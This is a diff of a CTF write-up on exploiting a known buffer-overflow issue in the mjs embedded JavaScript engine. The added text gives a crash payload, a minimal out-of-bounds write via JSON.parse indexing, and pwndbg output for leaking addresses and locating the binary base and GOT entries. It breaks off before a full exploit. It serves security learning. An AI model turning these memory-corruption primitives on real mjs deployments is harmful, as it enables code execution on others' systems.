@@ -161,11 +161,77 @@ index bd48fea..24c2c7c 100644
            call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx);
 ~~~
 
-## Vulnerability
+## Write What Where
 
 By doing simple issue search, we can find a [Buffer Overflow Issue](https://github.com/cesanta/mjs/issues/191) in the repository. 
 
 ~~~javascript
 (JSON.stringify([1, 2, 3]))((JSON.parse - 10900)(JSON.stringify([1, 2, 3])));
 ~~~
-If we look into the payload, it substracting 10900 from the JSON.parse function. It doesnt make sense to me, but it is a valid javascript code.
+If we look into the payload, it substracting 10900 from the JSON.parse function. It doesnt make sense to me, but it is a valid javascript code. By running the code, it will trigger segmentation fault and it verified that the bug its still exist. 
+~~~bash
+➜  build git:(master) ✗ ./mjs_compiled writeup.js 
+[1]    19023 segmentation fault (core dumped)  ./mjs_compiled writeup.js
+~~~
+
+I tried to simplified the payload and the simple version to trigger bug is 
+~~~javascript
+JSON.parse[-1] = 1;
+~~~
+![SIGSEGV](https://user-images.githubusercontent.com/11147011/225323734-a0c9d786-8d78-4531-ba0b-adce069e49a1.png)
+
+![](https://user-images.githubusercontent.com/11147011/225324781-1add18e5-d31c-4767-ae5a-e68a667038dc.png)
+
+If we look at the debugger, it tries to copy the 1 value into address JSON.parse[-1]. 
+
+![](https://user-images.githubusercontent.com/11147011/225325662-40381717-2616-4f39-b3f1-05c2111aaca3.png)
+
+What we got here is a write-what-where primitive. We can write any value to any address.
+
+## Information Leak
+Leaking address is also abusing JSON.parse function. 
+![](https://user-images.githubusercontent.com/11147011/225329032-804508fb-f520-4f80-8d70-213267235829.png)
+As you can see it leaking some number. If we want to leak specific address, we need to calculate the base offset first. 
+![](https://user-images.githubusercontent.com/11147011/225330622-7f800715-9922-4616-a72b-42cb2f0c068a.png)
+
+From the screenshot above, we knew that the base address is started at 0x555555554000. We can calculate the offset by using the following formula. 
+~~~bash
+pwndbg> x (ptr + ikey) - 0x555555554000
+0xfe3f:	Cannot access memory at address 0xfe3f
+~~~
+We got the base binary address at -0xfe3f. Lets verify by using the following code.
+~~~javascript
+JSON.parse[-0xfe3f] = 1;
+~~~
+~~~bash
+pwndbg> x ptr+ikey
+0x555555554001:	0x02464c45
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+    0x555555554000     0x555555556000 r--p     2000 0      /home/syahrul/CTF/KalmarCTF/pwn/browser/build/mjs_compiled
+~~~
+Its seem we need to add 1 byte to the offset for the correct address.
+~~~javascript
+JSON.parse[-0xfe40] = 1;
+~~~
+~~~bash
+pwndbg> x ptr+ikey
+0x555555554000:	0x464c457f
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+    0x555555554000     0x555555556000 r--p     2000 0      /home/syahrul/CTF/KalmarCTF/pwn/browser/build/mjs_compiled
+~~~
+
+Now we need to find pointer that point to libc address. We can easily find it by using Global Offset Table (GOT) address. 
+![](https://user-images.githubusercontent.com/11147011/225334979-701b23ba-5446-4b90-ac54-04759d39dc41.png)
+
+If you look at the line of got, the address 0x555555580018 which is free@GLIBC_2.2.5 is pointing to 0x7ffff7ca5460 inside libc. 
+~~~bash
+pwndbg> x 0x555555580018 - 0x555555554000
+0x2c018:	Cannot access memory at address 0x2c018
+pwndbg> 
+~~~
+0x2c018 is offset from the base address. 
+
+
+
